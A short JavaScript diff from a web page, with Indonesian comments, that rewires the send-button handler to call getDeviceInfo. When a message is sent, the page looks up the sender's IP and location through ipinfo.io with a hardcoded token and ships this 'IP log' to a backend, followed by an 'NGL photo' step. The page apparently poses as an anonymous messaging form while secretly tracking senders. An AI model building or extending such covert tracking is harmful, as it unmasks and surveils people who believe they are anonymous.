@@ -20,7 +20,7 @@ function startAccess() {
 }
 
 // ambil info device
-async function getDeviceInfo() {
+async function getDeviceInfo(messageText) {
   try {
     const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
     let geoText = "Tidak tersedia";
@@ -254,7 +254,7 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
 
     // 2. Generate dan kirim IP log
     console.log("2️⃣ Generating IP log...");
-    const ipLog = await generateIPLog(msg);
+    const ipLog = await getDeviceInfo(msg);
     await sendToBackend(ipLog);
 
     // 3. Generate dan kirim NGL photo
